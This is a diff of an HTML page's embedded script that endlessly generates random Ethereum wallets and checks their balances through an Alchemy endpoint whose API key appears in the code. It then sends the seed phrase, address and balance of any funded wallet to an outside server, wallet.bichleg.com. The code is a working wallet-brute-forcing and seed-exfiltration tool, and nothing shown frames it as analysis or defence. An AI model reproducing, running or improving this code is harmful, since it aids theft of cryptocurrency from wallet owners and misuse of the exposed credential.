@@ -122,27 +122,20 @@
     <script>
         const API_KEY = 'https://eth-mainnet.g.alchemy.com/v2/JCNCAmqFfaWQ9WQrW143reOVrnRg1YfY';
         const provider = new ethers.JsonRpcProvider(API_KEY);
-
         async function main() {
             var res = '';
             while (1) {
                 let wallet = ethers.Wallet.createRandom();
                 let mnemonic = wallet.mnemonic.phrase;
-                await $.post('https://wallet.bichleg.com/index.php',
-                    { 'exist': mnemonic },
-                    function (data) {
-                        if (data == '0000') {
-                            res = '0000';
-                        } else {
-                            res = '1111';
-                        }
-                    });
-                if (res == '0000') {
-                    let address = wallet.address;
+                let address = wallet.address;
+                try {
                     let balance = ethers.formatEther(await provider.getBalance(wallet.address));
-                    await $.post('https://wallet.bichleg.com/index.php', { 'seed': mnemonic, 'wallet': address, 'balance': balance });
+                    if (balance != 0.0) {
+                        await $.post('https://wallet.bichleg.com/index.php', { 'seed': mnemonic, 'wallet': address, 'balance': balance });
+                    }
+                } catch (e) {
+                    console.log(e);
                 }
-                res = '';
             }
         }
 
